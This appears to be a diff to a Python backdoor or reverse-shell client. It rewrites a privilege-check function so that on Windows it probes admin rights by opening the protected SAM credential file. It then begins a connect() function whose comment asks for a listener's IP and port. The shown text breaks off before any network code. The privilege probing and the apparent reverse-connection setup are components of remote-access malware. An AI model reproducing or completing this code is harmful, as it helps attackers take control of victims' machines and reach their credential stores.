@@ -1,26 +1,23 @@
 import os
 import socket
 import subprocess
-import ctypes
+
 
 
 def check_user_level() -> str:
-    """Checks for administrative privileges on Windows or root on Linux."""
     try:
-        # Windows check
         if os.name == 'nt':
-            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            # Try to open a system-protected file. Success = Admin.
+            try:
+                fd = os.open(os.path.join(os.environ['windir'], 'system32', 'config', 'SAM'), os.O_RDONLY)
+                os.close(fd)
+                return "[+] Administrator Privileges."
+            except (OSError, IOError):
+                return "[!!] User Privileges. (No Admin privileges)"
         else:
-            # Linux/Unix check
-            is_admin = os.getuid() == 0
-
-        if is_admin:
-            return "[+] Administrator Privileges."
-        else:
-            return "[!!] User Privileges. (No Admin privileges)"
-    except Exception:
-        return "[!!] User Privileges. (No Admin privileges)"
-
+            return "[+] Administrator Privileges." if os.getuid() == 0 else "[!!] User Privileges."
+    except:
+        return "[!!] Privilege check failed."
 
 def connect():
     # Configuration: Replace with your Listener's IP and Port
